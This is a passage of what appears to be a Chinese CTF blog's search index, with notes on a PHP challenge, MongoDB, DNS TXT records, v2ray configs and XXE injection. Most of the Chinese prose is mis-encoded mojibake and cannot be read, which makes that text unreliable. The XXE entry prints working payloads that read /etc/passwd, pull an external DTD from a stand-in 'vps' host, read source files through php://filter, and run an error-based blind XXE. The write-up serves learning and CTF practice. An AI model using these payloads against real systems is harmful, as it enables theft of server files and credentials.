    <content type="text"><![CDATA[web26 12345678910111213141516171819&lt;?php $num=$_GET['num']; $str=$_GET['str']; show_source(__FILE__); if (isset($num)&amp;&amp;isset($str)) &#123; if (preg_match('/\d+/sD',$str)) &#123; echo "vagetable hhhh"; exit(); &#125; $result=is_numeric($num) and is_numeric($str); if ($result) &#123; include "flag.php"; echo "$flag"; &#125; else&#123; echo "vagetablessssss"; &#125; &#125; ?&gt;]]></content>
  </entry>
  <entry>
    <title><![CDATA[MongoDbå­¦ä¹ ]]></title>
    <url>%2F2019%2F08%2F16%2FMongoDb%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘æŽ¥è§¦äº†ä¸€äº›NoSQLçš„é¢˜ç›®ï¼Œä¸»è¦çš„æ•°æ®åº“è¿˜æ˜¯ä»¥MongoDbä¸ºä¸»ï¼ŒäºŽæ˜¯æ€»ç»“ä¸€ä¸‹MongoDbçš„å­¦ä¹  MongoDbä¸­çš„æ•°æ®åº“ï¼Œé›†åˆï¼Œæ–‡æ¡£å’Œä¼ ç»Ÿçš„å…³ç³»åž‹æ•°æ®çš„å¯¹åº”å°±ä¸ç”¨ç»†è¯´äº† dbæ˜¾ç¤ºå½“å‰ä½¿ç”¨çš„æ•°æ®åº“ show dbsæ˜¾ç¤ºæ‰€æœ‰å¯ç”¨çš„æ•°æ®åº“ï¼Œå¦‚æžœä¸€ä¸ªæ•°æ®åº“é‡Œé¢å•¥éƒ½æ²¡æœ‰è¿™é‡Œå°±ä¸ä¼šæ˜¾ç¤º use xxxæŒ‡å®šä½¿ç”¨å“ªç§ä¸ªæ•°æ®åº“ï¼Œå¦‚æžœä¸å­˜åœ¨ä¼šè‡ªåŠ¨åˆ›å»º show tablesæ˜¾ç¤ºå½“å‰æ•°æ®åº“ä¸‹æ‰€æœ‰çš„è¡¨(åˆå›žåˆ°äº†å…³ç³»åž‹æ•°æ®åº“çš„æ¦‚å¿µäº†23333) åŽé¢çš„å®žéªŒéƒ½åœ¨testæ•°æ®åº“ä¸‹ï¼š 123&gt; show tablesrunoobusers æ’å…¥æ•°æ® 123&gt; db.users.insert(&#123;&apos;username&apos;:&apos;xxx&apos;,&apos;password&apos;:11111&#125;... )WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;) å½“å‰è¡¨ä¸­çš„å†…å®¹ï¼š 12345678&gt; db.users.find()&#123; &quot;_id&quot; : ObjectId(&quot;5d53bd7674357af54ea6fb01&quot;), &quot;username&quot; : &quot;prontosil&quot;, &quot;password&quot; : &quot;123456&quot; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5d53bd8574357af54ea6fb02&quot;), &quot;username&quot; : &quot;abc&quot;, &quot;password&quot; : &quot;gaashasfa&quot; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5d53bd8a74357af54ea6fb03&quot;), &quot;username&quot; : &quot;abcddd&quot;, &quot;password&quot; : &quot;gaasasdfashasfa&quot; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5d53beab74357af54ea6fb04&quot;), &quot;username&quot; : &quot;xxxppp&quot; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5d53c8ae74357af54ea6fb05&quot;), &quot;username&quot; : &quot;pxy&quot;, &quot;password&quot; : 123 &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5d5642185a9caa8f023df426&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : 123 &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5d564c035a9caa8f023df427&quot;), &quot;username&quot; : &quot;xxx&quot;, &quot;password&quot; : 11111 &#125; MongoDbèšåˆ MongoDBä¸­èšåˆ(aggregate)ä¸»è¦ç”¨äºŽå¤„ç†æ•°æ®(è¯¸å¦‚ç»Ÿè®¡å¹³å‡å€¼,æ±‚å’Œç­‰)ï¼Œå¹¶è¿”å›žè®¡ç®—åŽçš„æ•°æ®ç»“æžœã€‚æœ‰ç‚¹ç±»ä¼¼sqlè¯­å¥ä¸­çš„ count(*)ã€‚ å‚è€ƒèœé¸Ÿæ•™ç¨‹ä¸­çš„æ —å­ï¼š é›†åˆä¸­çš„æ•°æ®å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627&#123; _id: ObjectId(7df78ad8902c) title: &apos;MongoDB Overview&apos;, description: &apos;MongoDB is no sql database&apos;, by_user: &apos;runoob.com&apos;, url: &apos;http://www.runoob.com&apos;, tags: [&apos;mongodb&apos;, &apos;database&apos;, &apos;NoSQL&apos;], likes: 100&#125;,&#123; _id: ObjectId(7df78ad8902d) title: &apos;NoSQL Overview&apos;, description: &apos;No sql database is very fast&apos;, by_user: &apos;runoob.com&apos;, url: &apos;http://www.runoob.com&apos;, tags: [&apos;mongodb&apos;, &apos;database&apos;, &apos;NoSQL&apos;], likes: 10&#125;,&#123; _id: ObjectId(7df78ad8902e) title: &apos;Neo4j Overview&apos;, description: &apos;Neo4j is no sql database&apos;, by_user: &apos;Neo4j&apos;, url: &apos;http://www.neo4j.com&apos;, tags: [&apos;neo4j&apos;, &apos;database&apos;, &apos;NoSQL&apos;], likes: 750&#125;, ä½¿ç”¨aggregateè¯­å¥ï¼š 123456789101112131415&gt; db.mycol.aggregate([&#123;$group : &#123;_id : &quot;$by_user&quot;, num_tutorial : &#123;$sum : 1&#125;&#125;&#125;])&#123; &quot;result&quot; : [ &#123; &quot;_id&quot; : &quot;runoob.com&quot;, &quot;num_tutorial&quot; : 2 &#125;, &#123; &quot;_id&quot; : &quot;Neo4j&quot;, &quot;num_tutorial&quot; : 1 &#125; ], &quot;ok&quot; : 1&#125;&gt; å®ƒç±»ä¼¼äºŽï¼š select by_user, count(*) from mycol group by by_user]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>MongoDb</tag>
        <tag>NoSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNSè§£æžè®°å½•]]></title>
    <url>%2F2019%2F08%2F16%2FDNS%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[åˆé‡åˆ°äº†ä¸€åˆ°å¤´ç–¼çš„MISCç­¾åˆ°é¢˜ï¼Œè™½è¯´æœ‰ç‚¹è„‘æ´žä½†è¿˜æ˜¯åŸºç¡€çŸ¥è¯†ç§¯ç´¯çš„ä¸å¤Ÿã€‚ DNSè§£æžè®°å½•ï¼š Aè®°å½•ã€AAAAè®°å½•ã€CNAMEè®°å½•ã€MXè®°å½•ã€NSè®°å½•ã€TXTè®°å½•ã€SRVè®°å½•ã€URLè½¬å‘ å„ç§è®°å½•ç®€è®°å¦‚ä¸‹ï¼š Aè®°å½•ï¼š å°†åŸŸåæŒ‡å‘ä¸€ä¸ªIPv4åœ°å€ï¼ˆä¾‹å¦‚ï¼š100.100.100.100ï¼‰ï¼Œéœ€è¦å¢žåŠ Aè®°å½• CNAMEè®°å½•ï¼š å¦‚æžœå°†åŸŸåæŒ‡å‘ä¸€ä¸ªåŸŸåï¼Œå®žçŽ°ä¸Žè¢«æŒ‡å‘åŸŸåç›¸åŒçš„è®¿é—®æ•ˆæžœï¼Œéœ€è¦å¢žåŠ CNAMEè®°å½•ã€‚è¿™ä¸ªåŸŸåä¸€èˆ¬æ˜¯ä¸»æœºæœåŠ¡å•†æä¾›çš„ä¸€ä¸ªåŸŸå MXè®°å½•ï¼š å»ºç«‹ç”µå­é‚®ç®±æœåŠ¡ï¼Œå°†æŒ‡å‘é‚®ä»¶æœåŠ¡å™¨åœ°å€ï¼Œéœ€è¦è®¾ç½®MXè®°å½•ã€‚å»ºç«‹é‚®ç®±æ—¶ï¼Œä¸€èˆ¬ä¼šæ ¹æ®é‚®ç®±æœåŠ¡å•†æä¾›çš„MXè®°å½•å¡«å†™æ­¤è®°å½• NSè®°å½•ï¼š åŸŸåè§£æžæœåŠ¡å™¨è®°å½•ï¼Œå¦‚æžœè¦å°†å­åŸŸåæŒ‡å®šæŸä¸ªåŸŸåæœåŠ¡å™¨æ¥è§£æžï¼Œéœ€è¦è®¾ç½®NSè®°å½• TXTè®°å½•ï¼š å¯ä»»æ„å¡«å†™ï¼Œå¯ä¸ºç©ºã€‚ä¸€èˆ¬åšä¸€äº›éªŒè¯è®°å½•æ—¶ä¼šä½¿ç”¨æ­¤é¡¹ï¼Œå¦‚ï¼šåšSPFï¼ˆååžƒåœ¾é‚®ä»¶ï¼‰è®°å½• AAAAè®°å½•ï¼š å°†ä¸»æœºåï¼ˆæˆ–åŸŸåï¼‰æŒ‡å‘ä¸€ä¸ªIPv6åœ°å€ï¼ˆä¾‹å¦‚ï¼šff03:0:0:0:0:0:0:c1ï¼‰ï¼Œéœ€è¦æ·»åŠ AAAAè®°å½• SRVè®°å½•ï¼š æ·»åŠ æœåŠ¡è®°å½•æœåŠ¡å™¨æœåŠ¡è®°å½•æ—¶ä¼šæ·»åŠ æ­¤é¡¹ï¼ŒSRVè®°å½•äº†å“ªå°è®¡ç®—æœºæä¾›äº†å“ªä¸ªæœåŠ¡ã€‚æ ¼å¼ä¸ºï¼šæœåŠ¡çš„åå­—.åè®®çš„ç±»åž‹ï¼ˆä¾‹å¦‚ï¼š_example-server._tcpï¼‰ã€‚ SOAè®°å½•ï¼š SOAå«åšèµ·å§‹æŽˆæƒæœºæž„è®°å½•ï¼ŒNSç”¨äºŽæ ‡è¯†å¤šå°åŸŸåè§£æžæœåŠ¡å™¨ï¼ŒSOAè®°å½•ç”¨äºŽåœ¨ä¼—å¤šNSè®°å½•ä¸­é‚£ä¸€å°æ˜¯ä¸»æœåŠ¡å™¨ PTRè®°å½•ï¼š PTRè®°å½•æ˜¯Aè®°å½•çš„é€†å‘è®°å½•ï¼Œåˆç§°åšIPåæŸ¥è®°å½•æˆ–æŒ‡é’ˆè®°å½•ï¼Œè´Ÿè´£å°†IPåå‘è§£æžä¸ºåŸŸå æ˜¾æ€§URLè½¬å‘è®°å½•ï¼š å°†åŸŸåæŒ‡å‘ä¸€ä¸ªhttp(s)åè®®åœ°å€ï¼Œè®¿é—®åŸŸåæ—¶ï¼Œè‡ªåŠ¨è·³è½¬è‡³ç›®æ ‡åœ°å€ã€‚ä¾‹å¦‚ï¼šå°†www.liuht.cnæ˜¾æ€§è½¬å‘åˆ°www.itbilu.comåŽï¼Œè®¿é—®www.liuht.cnæ—¶ï¼Œåœ°å€æ æ˜¾ç¤ºçš„åœ°å€ä¸ºï¼šwww.itbilu.comã€‚ éšæ€§URè½¬å‘è®°å½•Lï¼š å°†åŸŸåæŒ‡å‘ä¸€ä¸ªhttp(s)åè®®åœ°å€ï¼Œè®¿é—®åŸŸåæ—¶ï¼Œè‡ªåŠ¨è·³è½¬è‡³ç›®æ ‡åœ°å€ï¼Œéšæ€§è½¬å‘ä¼šéšè—çœŸå®žçš„ç›®æ ‡åœ°å€ã€‚ä¾‹å¦‚ï¼šå°†www.liuht.cnæ˜¾æ€§è½¬å‘åˆ°www.itbilu.comåŽï¼Œè®¿é—®www.liuht.cnæ—¶ï¼Œåœ°å€æ æ˜¾ç¤ºçš„åœ°å€ä»ç„¶æ˜¯ï¼šwww.liuht.cnã€‚ æ‰€ä»¥è¿™é¢˜å°±æ˜¯ï¼š 1234567æœåŠ¡å™¨: 192.168.1.1Address: 192.168.1.1éžæƒå¨åº”ç­”:gamectf.com text = &quot;flag&#123;welcome_TXT&#125;&quot; æ¯”å¦‚æˆ‘çš„åŸŸåè§£æžè®°å½•ï¼š ç”¨digå‘½ä»¤ä¹Ÿè¡Œï¼š 12345678910111213141516171819$ dig -t txt gamectf.com ; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.3-Ubuntu &lt;&lt;&gt;&gt; -t txt gamectf.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 16974;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;gamectf.com. IN TXT;; ANSWER SECTION:gamectf.com. 600 IN TXT &quot;flag&#123;welcome_TXT&#125;&quot;;; Query time: 26 msec;; SERVER: 192.168.1.1#53(192.168.1.1);; WHEN: Fri Aug 16 07:18:56 CST 2019;; MSG SIZE rcvd: 70 ä½¿ç”¨digå‘½ä»¤ç”šè‡³å¯ä»¥ç›´è§‚åœ°æ„Ÿå—åˆ°DNSè§£æžçš„å…¨è¿‡ç¨‹ï¼Œç„¶è€Œåœ¨æˆ‘çš„WSLä¸Šåªæœ‰ä¸€ç‚¹ç‚¹è®°å½•]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[v2rayå­¦ä¹ ]]></title>
    <url>%2F2019%2F08%2F15%2Fv2ray%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[V2Ray ä½¿ç”¨ inbound(ä¼ å…¥) å’Œ outbound(ä¼ å‡º) çš„ç»“æž„ï¼Œè¿™æ ·çš„ç»“æž„éžå¸¸æ¸…æ™°åœ°ä½“çŽ°äº†æ•°æ®åŒ…çš„æµåŠ¨æ–¹å‘ï¼ŒåŒæ—¶ä¹Ÿä½¿å¾— V2Ray åŠŸèƒ½å¼ºå¤§å¤æ‚çš„åŒæ—¶è€Œä¸æ··ä¹±ï¼Œæ¸…æ™°æ˜Žäº†ã€‚å½¢è±¡åœ°è¯´ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ V2Ray å½“ä½œä¸€ä¸ªç›’å­ï¼Œè¿™ä¸ªç›’å­æœ‰å…¥å£å’Œå‡ºå£(å³ inbound å’Œ outbound)ï¼Œæˆ‘ä»¬å°†æ•°æ®åŒ…é€šè¿‡æŸä¸ªå…¥å£æ”¾è¿›è¿™ä¸ªç›’å­é‡Œï¼Œç„¶åŽè¿™ä¸ªç›’å­ä»¥æŸç§æœºåˆ¶ï¼ˆè¿™ä¸ªæœºåˆ¶å…¶å®žå°±æ˜¯è·¯ç”±ï¼ŒåŽé¢ä¼šè®²åˆ°ï¼‰å†³å®šè¿™ä¸ªæ•°æ®åŒ…ä»Žå“ªä¸ªå‡ºå£åå‡ºæ¥ã€‚ä»¥è¿™æ ·çš„è§’åº¦ç†è§£çš„è¯ï¼ŒV2Ray åšå®¢æˆ·ç«¯ï¼Œåˆ™ inbound æŽ¥æ”¶æ¥è‡ªæµè§ˆå™¨æ•°æ®ï¼Œç”± outbound å‘å‡ºåŽ»(é€šå¸¸æ˜¯å‘åˆ° V2Ray æœåŠ¡å™¨)ï¼›V2Ray åšæœåŠ¡å™¨ï¼Œåˆ™ inbound æŽ¥æ”¶æ¥è‡ª V2Ray å®¢æˆ·ç«¯çš„æ•°æ®ï¼Œç”± outbound å‘å‡ºåŽ»(é€šå¸¸æ˜¯å¦‚ Google ç­‰æƒ³è¦è®¿é—®çš„ç›®æ ‡ç½‘ç«™)ã€‚ v2rayçš„å·¥ä½œåŽŸç†ï¼š å®¢æˆ·ç«¯ï¼š å‡è®¾å®¢æˆ·ç«¯é…ç½®inboundsï¼Œpostä¸º1080ï¼Œåè®®æ˜¯socksã€‚é¦–å…ˆéœ€è¦åœ¨æµè§ˆå™¨ä¸­è®¾ç½®ä»£ç†sock host:127.0.0.1 port 1080 å¦‚æžœè®¿é—®google.com é‚£ä¹ˆæµè§ˆå™¨çš„æ•°æ®åŒ…ä¼šå‘é€åˆ°æœ¬æœºçš„1080ç«¯å£ï¼Œè¿™ä¸ªæ—¶å€™æ•°æ®åŒ…è¢«æœ¬æœºçš„v2rayå®¢æˆ·ç«¯æ”¶åˆ° å†çœ‹outboundsã€‚åè®®æ˜¯vmessï¼Œv2rayå®¢æˆ·ç«¯æŽ¥æ”¶åˆ°æ•°æ®åŒ…ä¹‹åŽæ‰“åŒ…æˆvmessçš„æ ¼å¼å¹¶ä¸”ç”¨é¢„è®¾çš„idåŠ å¯†ï¼Œç„¶åŽå‘é€åˆ°æœåŠ¡å™¨åœ°å€xxxxï¼Œç«¯å£pppp æ‰€ä»¥å¦‚ä¸‹çš„é…ç½®å¤§æ¦‚å°±èƒ½ç†è§£äº†ï¼š å®¢æˆ·ç«¯ï¼š 1234567891011121314151617181920212223242526272829303132333435&#123; "inbounds": [ &#123; "port": 1080, // ç›‘å¬ç«¯å£ "protocol": "socks", // å…¥å£åè®®ä¸º SOCKS 5 "sniffing": &#123; "enabled": true, "destOverride": ["http", "tls"] &#125;, "settings": &#123; "auth": "noauth" //socksçš„è®¤è¯è®¾ç½®ï¼Œnoauth ä»£è¡¨ä¸è®¤è¯ï¼Œç”±äºŽ socks é€šå¸¸åœ¨å®¢æˆ·ç«¯ä½¿ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œä¸è®¤è¯ &#125; &#125; ], "outbounds": [ &#123; "protocol": "vmess", // å‡ºå£åè®® "settings": &#123; "vnext": [ &#123; "address": "serveraddr.com", // æœåŠ¡å™¨åœ°å€ï¼Œè¯·ä¿®æ”¹ä¸ºä½ è‡ªå·±çš„æœåŠ¡å™¨ IP æˆ–åŸŸå "port": 16823, // æœåŠ¡å™¨ç«¯å£ "users": [ &#123; "id": "b831381d-6324-4d53-ad4f-8cda48b30811", // ç”¨æˆ· IDï¼Œå¿…é¡»ä¸ŽæœåŠ¡å™¨ç«¯é…ç½®ç›¸åŒ "alterId": 64 // æ­¤å¤„çš„å€¼ä¹Ÿåº”å½“ä¸ŽæœåŠ¡å™¨ç›¸åŒ &#125; ] &#125; ] &#125; &#125; ]&#125; æµè§ˆå™¨---&gt;æœ¬æœºçš„v2ray---&gt;vpsç›‘å¬çš„ç«¯å£ æœåŠ¡ç«¯é…ç½®ï¼š 12345678910111213141516171819202122&#123; "inbounds": [ &#123; "port": 16823, // æœåŠ¡å™¨ç›‘å¬ç«¯å£ "protocol": "vmess", // ä¸»ä¼ å…¥åè®® "settings": &#123; "clients": [ &#123; "id": "b831381d-6324-4d53-ad4f-8cda48b30811", // ç”¨æˆ· IDï¼Œå®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨å¿…é¡»ç›¸åŒ "alterId": 64 &#125; ] &#125; &#125; ], "outbounds": [ &#123; "protocol": "freedom", // ä¸»ä¼ å‡ºåè®® "settings": &#123;&#125; &#125; ]&#125; åœ¨å®¢æˆ·ç«¯é…ç½®çš„ inbounds ä¸­ï¼Œæœ‰ä¸€ä¸ª &quot;sniffing&quot; å­—æ®µï¼ŒV2Ray æ‰‹å†Œè§£é‡Šä¸ºâ€œæµé‡æŽ¢æµ‹ï¼Œæ ¹æ®æŒ‡å®šçš„æµé‡ç±»åž‹ï¼Œé‡ç½®æ‰€è¯·æ±‚çš„ç›®æ ‡â€ï¼Œè¿™è¯ä¸å¤ªå¥½ç†è§£ï¼Œç®€å•è¯´è¿™ä¸œè¥¿å°±æ˜¯ä»Žç½‘ç»œæµé‡ä¸­è¯†åˆ«å‡ºåŸŸåã€‚è¿™ä¸ª sniffing æœ‰ä¸¤ä¸ªç”¨å¤„ï¼š è§£å†³ DNS æ±¡æŸ“ï¼› å¯¹äºŽ IP æµé‡å¯ä»¥åº”ç”¨åŽæ–‡æåˆ°çš„åŸŸåè·¯ç”±è§„åˆ™ï¼› è¯†åˆ« BT åè®®ï¼Œæ ¹æ®è‡ªå·±çš„éœ€è¦æ‹¦æˆªæˆ–è€…ç›´è¿ž BT æµé‡ æŽ¥ç€çœ‹æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨é…ç½®çš„ id æ˜¯ b831381d-6324-4d53-ad4f-8cda48b30811ï¼Œæ‰€ä»¥ V2Ray æœåŠ¡å™¨æŽ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥çš„æ•°æ®åŒ…æ—¶å°±ä¼šå°è¯•ç”¨ b831381d-6324-4d53-ad4f-8cda48b30811 è§£å¯†ï¼Œå¦‚æžœè§£å¯†æˆåŠŸå†çœ‹ä¸€ä¸‹æ—¶é—´å¯¹ä¸å¯¹ï¼Œå¯¹çš„è¯å°±æŠŠæ•°æ®åŒ…å‘åˆ° outbound åŽ»ï¼Œoutbound.protocol æ˜¯ freedomï¼ˆfreedom çš„ä¸­æ–‡æ„æ€æ˜¯è‡ªç”±ï¼Œåœ¨è¿™é‡Œå§‘ä¸”å°†å®ƒç†è§£æˆç›´è¿žå§ï¼‰ï¼Œæ•°æ®åŒ…å°±ç›´æŽ¥å‘åˆ° google.com äº†ã€‚ å‚è€ƒ v2rayé…ç½®æŒ‡å—]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>v2ray</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xxeå­¦ä¹ ]]></title>
    <url>%2F2019%2F08%2F15%2Fxxe%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[ä»Šå¤©åšé¢˜çš„æ—¶å€™é‡åˆ°äº†ä¸€ä¸ªxxeç›¸å…³çš„é¢˜ç›®ï¼Œéš¾åº¦ä¸å¤§ï¼ŒçŽ°åœºå­¦ä¹ çš„xxeï¼Œäº‹åŽæ¥æ€»ç»“ä¸€ä¸‹ï¼š åŽŸé¢˜çš„åå­—æ˜¯who are youï¼Œè¿›åŽ»ä¹‹åŽæœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè¾“å…¥ä»€ä¹ˆå°±ä¼šå›žæ˜¾ä»€ä¹ˆï¼Œé¦–å…ˆè¯•äº†ä¸€ä¸‹xssï¼Œåªå‡ºçŽ°äº†alert(1) æŸ¥çœ‹é¡µé¢çš„æºä»£ç å‘çŽ°ï¼š 123456789101112131415161718192021222324function play() &#123; return false; &#125; function func() &#123; // document.getElementById().value var xml = '' + '&lt;\?xml version="1.0" encoding="UTF-8"\?&gt;' + '&lt;feedback&gt;' + '&lt;author&gt;' + document.getElementById('name').value+ '&lt;/author&gt;' + '&lt;/feedback&gt;'; console.log(xml); var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = function () &#123; if (xmlhttp.readyState == 4) &#123; // console.log(xmlhttp.readyState); // console.log(xmlhttp.responseText); var res = xmlhttp.responseText; document.getElementById('title').textContent = res &#125; &#125;; xmlhttp.open("POST", "index.php", true); xmlhttp.send(xml); return false; &#125;; æ˜¾ç„¶xmlæ•°æ®æ˜¯æ‹¼æŽ¥çš„ï¼Œç›´æŽ¥å¯¹&lt;script&gt;è¿›è¡Œå®žä½“ç¼–ç å°±èƒ½å¤Ÿxssï¼Œç„¶è€Œè¿™é¢˜çš„è€ƒç‚¹å¹¶ä¸æ˜¯è¿™ä¸ªã€‚ xmlç›¸å…³çš„è‡ªç„¶æ˜¯xxeï¼Œä¹Ÿå°±æ˜¯XML å¤–éƒ¨å®žä½“æ³¨å…¥ è¿™éœ€è¦æœ‰ä¸€ç‚¹DTDçš„çŸ¥è¯†ï¼š DTDï¼ˆæ–‡æ¡£ç±»åž‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æž„å»ºæ¨¡å—ã€‚ DTD å¯è¢«æˆè¡Œåœ°å£°æ˜ŽäºŽ XML æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚ DTDçš„å¼•å…¥æ˜¯ä¸ºäº†è§„èŒƒXMLçš„ï¼Œä»Žä¸€ä¸ªæ —å­å¯ä»¥çœ‹ï¼š DOCTYPEå£°æ˜Žäº†XMLç”±å“ªäº›æ ‡ç­¾ï¼Œå› ä¸ºXMLçš„æ ‡ç­¾ä¸åŒäºŽHTMLï¼Œæ˜¯å¯ä»¥è‡ªå®šä¹‰çš„ã€‚ DTDå¯ä»¥åœ¨XMLæ–‡æ¡£å†…éƒ¨å£°æ˜Žï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨,åŒæ—¶å®žä½“ä¹Ÿå¯ä»¥å†…éƒ¨å£°æ˜Žæˆ–è€…å¤–éƒ¨å¼•ç”¨ å†…éƒ¨å®žä½“å£°æ˜ŽD 12345678DTD å®žä¾‹:&lt;!ENTITY writer "Donald Duck."&gt;&lt;!ENTITY copyright "Copyright runoob.com"&gt;XML å®žä¾‹ï¼š&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; å¤–éƒ¨å®žä½“å£°æ˜Ž 12345678DTD å®žä¾‹:&lt;!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd"&gt;&lt;!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd"&gt;XML example:&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; æœ€å¸¸è§çš„å¼•å…¥å¤–éƒ¨å®žä½“å°±æ˜¯é€šè¿‡fileåè®®è¯»å–æ–‡ä»¶ï¼š 12345&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; å¦ä¸€ç§payload 123456&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY % d SYSTEM "http://vps/evil.dtd"&gt; %d;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; æˆ‘ä»¬å¯ä»¥åœ¨è‡ªå·±çš„VPSä¸Šæž„é€  1&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt; ä¹Ÿå¯ä»¥è¿™æ ·ï¼š 123&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a SYSTEM "http://vps//evil.dtd"&gt;&lt;c&gt;&amp;b;&lt;/c&gt; vpsä¸Šçš„evil.dtdå†…å®¹ï¼š &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; ä¸åŒçš„ç¨‹åºæ”¯æŒçš„åè®®ä¹Ÿæœ‰åŒºåˆ«ï¼Œæ¯”å¦‚ä»Šå¤©é‡åˆ°çš„é¢˜ç›®å°±æ˜¯æ”¯æŒphpä¼ªåè®®ï¼š okåˆ°è¿™é‡Œå°±å·®ä¸å¤šäº†ã€‚ çŒ®ä¸Šæ‹¿åˆ°é¢˜ç›®çš„payloadï¼š &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt; å…¶å®žå°±æ˜¯é€šè¿‡phpä¼ªåè®®åŽ»è¯»å–æ–‡ä»¶ï¼Œflagå°±åœ¨index.phpé‡Œé¢ æŽ¥ä¸‹æ¥çœ‹ä¸€é“Google ctf2019çš„é¢˜ç›®ï¼š ç›´å¥”ä¸»é¢˜å¥½äº†ï¼Œè¿™ä¸ªé¢˜ç›®æŠ“åŒ…å‘çŽ°ä¼ é€çš„æ˜¯jsonæ ¼å¼çš„æ•°æ®ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥ä¿®æ”¹ä¸ºXMLæ ¼å¼çš„æ•°æ®ï¼Œå¾ˆç¥žå¥‡å§ï¼š ä¹‹åŽè¿™ä¸ªé¢˜ç›®æ¶‰åŠåˆ°ä¸€ä¸ªä½¿ç”¨æœ¬åœ°çš„dtdæ¥ç›²æ³¨xxeçš„å§¿åŠ¿ï¼š payload 12345678910&lt;!DOCTYPE message[ &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt; &lt;!ENTITY % ISOamso ' &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passed"&gt; &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;&amp;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt; &amp;#x25;eval; &amp;#x25;error; '&gt; %local_dtd;]&gt; å‚è€ƒ CTFå­¦ä¹ --web--XXE èœé¸Ÿæ•™ç¨‹ æœªçŸ¥æ”»ç„‰çŸ¥é˜²â€”â€”XXEæ¼æ´žæ”»é˜²]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>xxe</tag>
        <tag>xml</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-stormçŽ¯å¢ƒ]]></title>
    <url>%2F2019%2F08%2F14%2Fphp-storm%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[ç»§ç»­é…ç½®äº†ä¸€æ³¢phpStormçš„çŽ¯å¢ƒï¼Œæ„Ÿè§‰å¯¹è¿™ä¸ªIDEè¿˜æœ‰å¾ˆå¤šå¯ä»¥ç ”ç©¶çš„åœ°æ–¹ åœ¨è¿™é‡Œå¯ä»¥ä¿®æ”¹phpçš„è·¯å¾„ï¼Œæˆ‘é€‰æ‹©äº†phpStudyçš„ä¸€ä¸ªphpè§£é‡Šå™¨ï¼Œå› ä¸ºå…¶ä¸­å®‰è£…äº†Xdebugã€‚ é…ç½®apacheçš„çŽ¯å¢ƒï¼Œé€‰æ‹©çš„æ˜¯Local or mounted folder,å› ä¸ºæœåŠ¡å™¨å°±åœ¨æœ¬åœ° è·¯ç”±æ˜ å°„ ä¹‹åŽå°±å¯ä»¥åœ¨phpStormå†™å®Œä»£ç éƒ¨ç½²åˆ°æœ¬åœ°çš„æœåŠ¡å™¨ä¸Šäº† ä¹Ÿå¯ä»¥debugäº†]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>phpStorm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP-Audit-Labså­¦ä¹ ]]></title>
    <url>%2F2019%2F08%2F13%2FPHP-Audit-Labs%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[php-challenge]]></title>
